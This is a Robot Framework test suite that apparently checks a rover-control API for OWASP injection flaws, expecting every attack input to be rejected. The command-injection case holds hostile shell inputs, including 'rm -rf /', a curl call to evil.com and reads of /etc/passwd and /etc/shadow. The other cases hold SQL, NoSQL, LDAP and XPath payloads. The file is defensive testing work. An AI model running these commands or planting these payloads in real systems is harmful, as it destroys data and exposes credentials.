*** Settings ***
Documentation     OWASP A3 (Injection) tests for SQL, command, and NoSQL injection
Library           RequestsLibrary
Library           Collections
Resource          ../resources/common.robot

*** Test Cases ***
SQL Injection In Query Parameters Rejected
    [Documentation]    A3 - SQL injection patterns in query params should be rejected
    Create Session    api    ${API_HOST}
    ${sql_payloads}=    Create List
    ...    /rovers?name=' OR '1'='1
    ...    /rovers?name=admin'--
    ...    /rovers?name=1;DROP TABLE users
    ...    /rovers?name=UNION SELECT * FROM users
    FOR    ${path}    IN    @{sql_payloads}
        ${resp}=    GET On Session    api    ${path}    expected_status=400
        Should Be Equal As Strings    ${resp.status_code}    400
    END

SQL Injection In JSON Body Rejected
    [Documentation]    A3 - SQL injection in request bodies should be sanitized or rejected
    Create Session    api    ${API_HOST}
    ${resp}=    POST On Session    api    /auth/login
    ...    json={"username": "admin' OR '1'='1", "password": "irrelevant"}
    ...    expected_status=401
    Should Be Equal As Strings    ${resp.status_code}    401    # Should not authenticate

Command Injection In Rover Commands
    [Documentation]    A3 - Shell metacharacters in rover commands should be rejected
    Create Session    api    ${API_HOST}
    ${resp}=    POST On Session    api    /auth/login
    ...    json={"username": "${ADMIN_USERNAME}", "password": "${ADMIN_PASSWORD}"}
    ...    expected_status=200
    ${token}=    Set Variable    ${resp.json()}[access_token]
    &{headers}=    Create Dictionary    Authorization=Bearer ${token}
    ${dangerous_commands}=    Create List
    ...    move; rm -rf /
    ...    scan & curl evil.com
    ...    `cat /etc/passwd`
    ...    $(cat /etc/shadow)
    FOR    ${cmd}    IN    @{dangerous_commands}
        ${resp}=    POST On Session    api    /rovers/${TEST_ROVER_ID_1}/command
        ...    json={"command": "${cmd}", "params": {}}
        ...    headers=${headers}
        ...    expected_status=400
        Should Be Equal As Strings    ${resp.status_code}    400
    END

NoSQL Injection Patterns
    [Documentation]    A3 - NoSQL injection patterns in JSON payloads should be rejected
    Create Session    api    ${API_HOST}
    ${resp}=    POST On Session    api    /auth/login
    ...    json={"username": "${ADMIN_USERNAME}", "password": "${ADMIN_PASSWORD}"}
    ...    expected_status=200
    ${token}=    Set Variable    ${resp.json()}[access_token]
    &{headers}=    Create Dictionary    Authorization=Bearer ${token}
    ${nosql_payloads}=    Create List
    ...    {"$ne": ""}    {"$gt": ""}    {"$where": "1==1"}
    FOR    ${payload}    IN    @{nosql_payloads}
        ${resp}=    POST On Session    api    /rovers/${TEST_ROVER_ID_1}/command
        ...    json={"command": "move", "params": ${payload}}
        ...    headers=${headers}
        ...    expected_status=400
        Should Be Equal As Strings    ${resp.status_code}    400
    END

LDAP Injection Prevention
    [Documentation]    A3 - LDAP injection patterns should be rejected
    Create Session    api    ${API_HOST}
    ${resp}=    POST On Session    api    /auth/login
    ...    json={"username": "*)(uid=*))", "password": "test"}
    ...    expected_status=401
    Should Be Equal As Strings    ${resp.status_code}    401

XPath Injection Prevention
    [Documentation]    A3 - XPath injection patterns should be rejected
    Create Session    api    ${API_HOST}
    ${resp}=    POST On Session    api    /auth/login
    ...    json={"username": "' or '1'='1", "password": "' or '1'='1"}
    ...    expected_status=401
    Should Be Equal As Strings    ${resp.status_code}    401
